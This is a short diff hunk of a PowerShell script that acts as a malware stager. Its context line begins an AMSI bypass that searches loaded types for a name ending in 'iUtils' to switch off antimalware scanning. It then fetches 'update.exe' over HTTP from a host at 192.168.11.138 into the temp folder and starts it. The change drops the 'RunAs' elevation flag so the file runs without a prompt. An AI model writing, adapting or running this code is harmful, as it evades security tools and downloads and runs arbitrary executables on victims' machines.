@@ -2,4 +2,4 @@ $a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b
 Start-Sleep -Seconds 1
 cmd /c curl -s http://192.168.11.138:8080/update.exe -o %TEMP%\update.exe
 Start-Sleep -Seconds 2
-Start-Process "$env:TEMP\update.exe" -Verb RunAs
+Start-Process "$env:TEMP\update.exe"
